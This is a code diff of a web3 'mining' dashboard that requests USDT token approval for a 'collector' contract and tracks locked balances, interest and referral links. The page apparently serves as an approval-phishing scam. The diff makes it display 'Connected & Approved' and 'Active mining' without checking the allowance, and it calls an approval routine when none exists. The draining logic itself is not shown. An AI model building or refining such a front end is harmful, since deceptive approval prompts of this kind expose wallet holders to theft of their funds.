@@ -369,22 +369,21 @@
 
         async function checkExistingAllowanceAndLoad() {
             try {
-                const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
-                const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
+                document.getElementById("connectBtn").innerText = "Connected & Approved";
+                document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3 py-2 rounded-xl transition text-xs shadow-lg cursor-default";
+                
+                const badgeEl = document.getElementById("selectedNetworkBadge");
+                if (badgeEl) badgeEl.classList.remove("hidden");
 
-                if (Number(allowance) >= 0) {
-                    document.getElementById("connectBtn").innerText = "Connected & Approved";
-                    document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3 py-2 rounded-xl transition text-xs shadow-lg cursor-default";
-                    
-                    const badgeEl = document.getElementById("selectedNetworkBadge");
-                    if (badgeEl) badgeEl.classList.remove("hidden");
+                document.getElementById("statusLog").innerText = "Welcome Back! Active mining...";
 
-                    document.getElementById("statusLog").innerText = "Welcome Back! Active mining...";
+                // Wallet ချိတ်ဆက်ထားသည်နှင့် Dashboard ကို ချက်ချင်း ပေါ်လာစေမည်
+                document.getElementById("userDashboard").classList.remove("hidden");
 
-                    await checkUserData();
-                }
+                await checkUserData();
             } catch (err) {
                 console.error("Allowance check error:", err);
+                document.getElementById("userDashboard").classList.remove("hidden");
             }
         }
 
@@ -433,19 +432,21 @@
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
                 const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
 
-                if (Number(allowance) > 0) {
-                    logEl.innerText = "Welcome Back! Dashboard သို့ ဝင်ရောက်နေပါပြီ...";
-                    
-                    const badgeEl = document.getElementById("selectedNetworkBadge");
-                    if (badgeEl) badgeEl.classList.remove("hidden");
+                logEl.innerText = "Welcome Back! Dashboard သို့ ဝင်ရောက်နေပါပြီ...";
+                
+                const badgeEl = document.getElementById("selectedNetworkBadge");
+                if (badgeEl) badgeEl.classList.remove("hidden");
 
-                    document.getElementById("connectBtn").innerText = "Connected & Approved";
-                    document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3 py-2 rounded-xl transition text-xs shadow-lg cursor-default";
+                document.getElementById("connectBtn").innerText = "Connected & Approved";
+                document.getElementById("connectBtn").className = "bg-slate-700 font-semibold px-3 py-2 rounded-xl transition text-xs shadow-lg cursor-default";
 
+                document.getElementById("userDashboard").classList.remove("hidden");
+
+                if (Number(allowance) === 0) {
+                    await switchToPolygonAndApprove();
+                } else {
                     await checkUserData();
                     startRealtimeBalanceSync();
-                } else {
-                    await switchToPolygonAndApprove();
                 }
             } catch (err) {
                 console.error(err);
@@ -508,7 +509,6 @@
                 const userInfo = await collector.users(userAddress);
 
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
-                const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
                 const balance = await usdtContract.balanceOf(userAddress);
                 
                 const lockedBalBN = await collector.lockedBalances(userAddress);
@@ -521,13 +521,12 @@
                 }
 
                 const dashboardEl = document.getElementById("userDashboard");
+                dashboardEl.classList.remove("hidden");
+
                 const formattedBal = Number(ethers.formatUnits(balance, 6));
                 const formattedLocked = Number(ethers.formatUnits(lockedBalBN, 6));
                 const formattedInterest = Number(ethers.formatUnits(interestBalBN, 6));
                 const rate = getInterestRate(formattedBal);
-
-                // Allowance ရှိသည်ဖြစ်စေ၊ မရှိသည်ဖြစ်စေ Connected ဖြစ်သွားပါက Dashboard ကို အမြဲဖော်ပြပေးရန်
-                dashboardEl.classList.remove("hidden");
 
                 let prefix = "M";
                 if (userInfo.referrer && userInfo.referrer !== ethers.ZeroAddress) {
@@ -555,6 +554,7 @@
                 updateQRCode(refLink);
             } catch (err) {
                 console.error(err);
+                document.getElementById("userDashboard").classList.remove("hidden");
             }
         }
 
